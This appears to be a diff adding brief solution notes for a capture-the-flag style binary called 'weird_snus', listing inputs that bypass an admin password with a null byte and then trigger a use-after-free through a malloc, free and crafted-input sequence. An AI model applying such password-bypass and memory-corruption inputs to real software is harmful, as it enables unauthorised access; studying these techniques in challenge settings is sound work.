@@ -1,0 +1,23 @@
+1. run binary
+./weird_snus. \(
+
+2. bypass admin password
+\x00\n
+
+3. input username
+LeoC\n
+
+Use after Free
+A -> M -> G -> A(trigger)
+
+4. malloc
+A\n
+
+5. free
+M\n
+
+6.
+G\x10\x00\x00\x00\n
+
+7. trigger
+A\n
